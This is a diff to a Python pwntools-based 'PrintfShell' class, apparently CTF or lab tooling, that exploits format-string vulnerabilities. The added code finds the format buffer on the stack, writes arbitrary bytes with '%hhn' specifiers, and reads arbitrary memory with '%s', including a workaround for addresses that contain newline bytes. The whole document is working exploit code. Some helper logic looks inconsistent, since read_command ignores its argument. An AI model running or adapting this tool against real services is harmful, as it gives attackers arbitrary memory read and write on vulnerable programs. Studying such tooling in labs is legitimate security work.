@@ -89,7 +89,8 @@ class PrintfShell(shell.Shell):
     @Command
     def find_memory_location(self):
         if self.stack_offset is None:
-            self.stack_offset = 12 # TODO: find the actual value : find_stack_offset
+            print("Need to set stack offset") # TODO: guess actual value : guess stack base
+            return
         if self.stack_base is None:
             print("Need to set stack base") # TODO: guess actual value : guess stack base
             return
@@ -102,14 +103,17 @@ class PrintfShell(shell.Shell):
             command += watchword
             res = self.read_response(command)
             if res == watchword + b"\n":
-                self.format_location = start - i
+                self.format_location = start - i - 2*8
                 print("Found stack at", hex(self.format_location))
                 return
         print("Not found")
     
     @Command
-    def write_byte(self, addr :int, n : value):
-        addr = pwnlib.util.packing.p64(int(addr, 16))
+    def write_byte(self, addr :int, n : int):
+        if type(addr) == str:
+            addr = int(addr, 16)
+        n = int(n)
+        addr = pwnlib.util.packing.p64(addr)
         if n != 0:
             command = bytes(f"%{n}d%{self.stack_offset+2}$hhn\x00", "ascii")
         else:
@@ -122,31 +126,41 @@ class PrintfShell(shell.Shell):
     def read_bytes(self, addr : int, n : int):
         if self.stack_offset is None:
             print("need to set the stack offset `set_offset`")
-            return
+            return  
+        def read_command(stack_offset):
+            command = bytes(f"%{self.stack_offset+1}$s", "ascii")
+            padn = (8 - len(command) % 8) % 8
+            pad = b"\x00"*padn
+            return command + pad
         n = int(n)
         addr = int(addr,16)
-        command = bytes(f"%{self.stack_offset+1}$s", "ascii")
-        padn = (8 - len(command) % 8) % 8
-        pad = b"\x00"*padn
         all_bytes = b""
         offset = 0
         while len(all_bytes) < n:
-            suffix = pad + pwnlib.util.packing.p64(addr + offset)
+            suffix = pwnlib.util.packing.p64(addr + offset)
             if b"\x0a" in suffix:
                 # (1) target_address (contains 0xa's)
                 # JUNKJUNK # because newlines
                 # address of (1)
                 # format_specifier
-                
-                # put suffix on stack
-                self.read_response("\x00"*16+new_suffix)
+                locations = []
+                for i, c in enumerate(suffix):
+                    if c == 0xa:
+                        locations.append((i,c))
+                new_suffix = suffix.replace(b"\x0a",b"\x01")
+                # put modded suffix on stack
+                self.read_response(b"\x00"*24+new_suffix)
 
                 # replace all bytes in suffix
-                all_bytes += b"\x00"
+                for i,c in locations:
+                    self.write_byte(self.format_location + 3*8 + i, 0xa)
+                # set command to read from the 3rd thing on stack
+                command = read_command(3)
             else:
-                res = self.read_response(command + suffix)
-                res = res + b"\x00"
-                all_bytes += res
+                command = read_command(1) + suffix
+            res = self.read_response(command)
+            res = res + b"\x00"
+            all_bytes += res
             offset = len(all_bytes)
         print(all_bytes)
         return all_bytes
